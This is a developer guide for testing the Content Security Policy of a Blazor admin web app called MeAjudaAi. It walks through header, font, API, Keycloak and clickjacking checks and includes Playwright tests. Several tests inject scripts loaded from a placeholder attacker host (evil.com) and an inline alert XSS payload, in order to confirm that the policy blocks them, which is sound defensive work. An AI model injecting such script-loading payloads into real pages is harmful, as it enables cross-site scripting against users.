# CSP Testing Guide

## Overview

This guide provides step-by-step instructions to test Content Security Policy (CSP) implementation in the MeAjudaAi Web Admin application.

---

## Prerequisites

- ✅ Application running locally (`dotnet run` or `F5`)
- ✅ Browser with DevTools (Chrome, Edge, Firefox)
- ✅ Access to browser console
- ✅ CSP middleware enabled

---

## Test 1: Verify CSP Headers

### Objective
Confirm CSP headers are present in HTTP responses.

### Steps

1. **Open application** in browser: `https://localhost:7001`

2. **Open DevTools** (F12)

3. **Go to Network tab**

4. **Refresh page** (Ctrl+R)

5. **Click on main document** (index.html or first request)

6. **Check Response Headers:**

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Referrer-Policy: strict-origin-when-cross-origin
```

### Expected Result
✅ CSP header present with correct policy
✅ Additional security headers present

### Failure Action
❌ If headers missing:
- Check middleware is registered in `ServiceCollectionExtensions.cs`
- Verify `app.UseContentSecurityPolicy()` is called
- Check middleware order (should be early in pipeline)

---

## Test 2: Verify CSP Meta Tag

### Objective
Confirm CSP meta tag exists in index.html as fallback.

### Steps

1. **Open DevTools** → **Elements/Inspector** tab

2. **View `<head>` section**

3. **Look for meta tag:**
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; ...">
```

### Expected Result
✅ Meta tag present with development CSP policy

### Notes
- Meta tag is **fallback only**
- HTTP headers take **precedence** over meta tags
- Production should rely on **HTTP headers**

---

## Test 3: Test Script Blocking

### Objective
Verify CSP blocks unauthorized scripts.

### Steps

1. **Open DevTools** → **Console** tab

2. **Inject malicious script:**
```javascript
// Type in console:
const script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.body.appendChild(script);
```

3. **Check console for error:**

### Expected Result
```
Refused to load the script 'https://evil.com/malicious.js' because it violates 
the following Content Security Policy directive: "script-src 'self' 'wasm-unsafe-eval'".
```

✅ Script blocked
✅ Console error displayed
✅ No network request to evil.com

### Failure Action
❌ If script loads:
- CSP is not working
- Check `script-src` directive
- Verify no `'unsafe-inline'` or `*` in script-src

---

## Test 4: Test Inline Script Blocking

### Objective
Verify CSP blocks inline `<script>` tags.

### Steps

1. **Open DevTools** → **Elements** tab

2. **Right-click `<body>`** → **Edit as HTML**

3. **Add inline script:**
```html
<script>alert('XSS Attack!');</script>
```

4. **Press Escape to save**

### Expected Result
```
Refused to execute inline script because it violates the following 
Content Security Policy directive: "script-src 'self' 'wasm-unsafe-eval'".
```

✅ Inline script blocked
✅ No alert shown
✅ Console error displayed

---

## Test 5: Test MudBlazor Styles

### Objective
Verify MudBlazor inline styles are allowed (CSP exception).

### Steps

1. **Navigate to any page** with MudBlazor components

2. **Verify components render correctly:**
   - AppBar (top navigation)
   - Buttons with colors
   - Tables with styles
   - Icons displaying

3. **Check console** for CSP style violations

### Expected Result
✅ MudBlazor components styled correctly
✅ No CSP violations for styles
✅ Google Fonts loading (if used)

### Explanation
- MudBlazor requires `style-src 'unsafe-inline'`
- This is documented exception to CSP
- Future improvement: Use nonces for stricter CSP

---

## Test 6: Test Google Fonts

### Objective
Verify Google Fonts load correctly.

### Steps

1. **Open DevTools** → **Network** tab

2. **Filter by Font**

3. **Refresh page**

4. **Check requests to:**
   - `https://fonts.googleapis.com` (CSS)
   - `https://fonts.gstatic.com` (Font files)

### Expected Result
✅ Font requests succeed (200 OK)
✅ No CSP violations in console
✅ Fonts render correctly on page

### Failure Action
❌ If fonts blocked:
```
Refused to load the stylesheet 'https://fonts.googleapis.com/...' because it violates 
the following Content Security Policy directive: "style-src 'self'".
```

**Fix:** Add to CSP:
```
style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
font-src 'self' https://fonts.gstatic.com data:;
```

---

## Test 7: Test API Connections

### Objective
Verify API calls are allowed by CSP.

### Steps

1. **Navigate to Providers page** (`/providers`)

2. **Open DevTools** → **Network** tab

3. **Refresh page**

4. **Check API calls:**
   - `https://localhost:7001/api/providers`
   - Other backend endpoints

### Expected Result
✅ API calls succeed
✅ No CSP violations for connect-src
✅ Data loads in components

### Failure Action
❌ If API blocked:
```
Refused to connect to 'https://localhost:7001/api/providers' because it violates 
the following Content Security Policy directive: "connect-src 'self'".
```

**Fix:** Add API URL to `connect-src`:
```
connect-src 'self' https://localhost:7001;
```

---

## Test 8: Test Keycloak Authentication

### Objective
Verify Keycloak login works with CSP.

### Steps

1. **Logout** (if authenticated)

2. **Open DevTools** → **Network** tab

3. **Click Login** button

4. **Monitor requests to:**
   - `http://localhost:8080` (Keycloak)
   - OAuth endpoints

5. **Complete login**

### Expected Result
✅ Redirects to Keycloak work
✅ OAuth token exchange succeeds
✅ User authenticated successfully
✅ No CSP violations

### Failure Action
❌ If Keycloak blocked:
```
Refused to connect to 'http://localhost:8080/realms/...' because it violates 
the following Content Security Policy directive: "connect-src 'self'".
```

**Fix:** Add Keycloak URL to `connect-src`:
```
connect-src 'self' https://localhost:7001 http://localhost:8080;
```

---

## Test 9: Test Image Loading

### Objective
Verify images load correctly with CSP.

### Steps

1. **Navigate to page with images**

2. **Open DevTools** → **Network** → **Filter by Img**

3. **Check image requests**

4. **Test data URI images** (inline base64):
```html
<img src="data:image/png;base64,iVBORw0KGg..." />
```

### Expected Result
✅ Images from same origin load
✅ Data URI images load
✅ HTTPS images load
✅ No CSP violations

### Notes
- `img-src 'self' data: https:` allows:
  - Same-origin images
  - Data URIs (base64)
  - Any HTTPS image (external CDNs)

---

## Test 10: Test Clickjacking Protection

### Objective
Verify frame-ancestors prevents embedding in iframes.

### Steps

1. **Create test HTML file** (outside app):
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Clickjacking Test</h1>
  <iframe src="https://localhost:7001"></iframe>
</body>
</html>
```

2. **Open test file** in browser

3. **Check iframe**

### Expected Result
```
Refused to display 'https://localhost:7001/' in a frame because it set 
'X-Frame-Options' to 'deny'.
```

✅ Iframe empty/blocked
✅ Console error shown
✅ Clickjacking prevented

---

## Test 11: Test CSP Violation Reporting

### Objective
Verify CSP violations are reported to backend.

### Steps

1. **Open backend logs** (watch mode):
```powershell
dotnet run --project src/Bootstrapper/MeAjudaAi.ApiService
```

2. **In browser console**, trigger violation:
```javascript
const script = document.createElement('script');
script.src = 'https://evil.com/attack.js';
document.body.appendChild(script);
```

3. **Check backend logs** for CSP report:

### Expected Result
```
[Warning] CSP Violation: https://localhost:7001/ blocked script-src from https://evil.com/attack.js
```

✅ Violation logged in backend
✅ Report contains blocked-uri
✅ Report contains violated-directive

### Notes
- Production should send reports to monitoring (Application Insights, Sentry)
- Set up alerts for violation spikes (possible attack)

---

## Test 12: Test Production CSP (Staging)

### Objective
Verify production-ready CSP works before deployment.

### Steps

1. **Update appsettings.Staging.json**:
```json
{
  "Environment": "Staging"
}
```

2. **Deploy to staging** environment

3. **Run all tests** (Test 1-11) in staging

4. **Verify stricter policy:**
   - `upgrade-insecure-requests` present
   - No localhost URLs in `connect-src`
   - `report-uri` configured

### Expected Result
✅ All functionality works in staging
✅ No CSP violations
✅ Stricter policy enforced
✅ Reports sent to production endpoint

---

## Automated CSP Testing

### Using Playwright

```csharp
[Test]
public async Task CSP_Headers_Should_Be_Present()
{
    var page = await Context.NewPageAsync();
    var response = await page.GotoAsync("https://localhost:7001");
    
    var cspHeader = response.Headers["content-security-policy"];
    Assert.That(cspHeader, Does.Contain("default-src 'self'"));
    Assert.That(cspHeader, Does.Contain("script-src 'self' 'wasm-unsafe-eval'"));
}

[Test]
public async Task CSP_Should_Block_Malicious_Scripts()
{
    var page = await Context.NewPageAsync();
    await page.GotoAsync("https://localhost:7001");
    
    var violations = new List<string>();
    page.Console += (_, e) =>
    {
        if (e.Text.Contains("Content Security Policy"))
            violations.Add(e.Text);
    };
    
    // Try to inject malicious script
    await page.EvaluateAsync(@"
        const script = document.createElement('script');
        script.src = 'https://evil.com/malicious.js';
        document.body.appendChild(script);
    ");
    
    await page.WaitForTimeoutAsync(1000);
    Assert.That(violations, Has.Count.GreaterThan(0));
}
```

---

## CSP Testing Checklist

### Browser Tests
- [ ] CSP headers present in responses
- [ ] CSP meta tag in index.html
- [ ] External scripts blocked
- [ ] Inline scripts blocked
- [ ] MudBlazor styles work
- [ ] Google Fonts load
- [ ] API calls succeed
- [ ] Keycloak auth works
- [ ] Images load correctly
- [ ] Clickjacking prevented

### Backend Tests
- [ ] Middleware adds headers
- [ ] CSP violations logged
- [ ] Reports endpoint works
- [ ] Production policy configured

### Production Readiness
- [ ] All tests pass in staging
- [ ] No false positives
- [ ] Monitoring configured
- [ ] Alerts set up
- [ ] Documentation complete

---

## Troubleshooting

### Issue: "Too many CSP violations"

**Cause:** Overly strict policy blocking legitimate resources

**Fix:**
1. Check browser console for specific violations
2. Identify blocked resource
3. Update CSP to allow if legitimate
4. Test again

### Issue: "CSP header not present"

**Cause:** Middleware not registered or disabled

**Fix:**
1. Check `ServiceCollectionExtensions.cs` has `app.UseContentSecurityPolicy()`
2. Verify middleware order (should be early)
3. Restart application

### Issue: "Mixed content warnings"

**Cause:** Loading HTTP resources on HTTPS page

**Fix:**
1. Add `upgrade-insecure-requests` to CSP
2. Update resource URLs to HTTPS
3. Remove HTTP from `connect-src` in production

---

## Tools

### Browser Extensions

- **CSP Evaluator** - Analyze CSP strength
- **HTTP Headers** - View response headers easily

### Online Tools

- https://csp-evaluator.withgoogle.com/ - Evaluate CSP policy
- https://securityheaders.com/ - Check all security headers
- https://observatory.mozilla.org/ - Comprehensive security scan

### Command Line

```powershell
# Check CSP headers with curl
curl -I https://localhost:7001

# Extract CSP header
curl -I https://localhost:7001 | Select-String "Content-Security-Policy"
```

---

## Next Steps

After CSP tests pass:
1. ✅ Deploy to staging
2. ✅ Monitor for 1 week
3. ✅ Address any violations
4. ✅ Deploy to production
5. ✅ Set up continuous monitoring
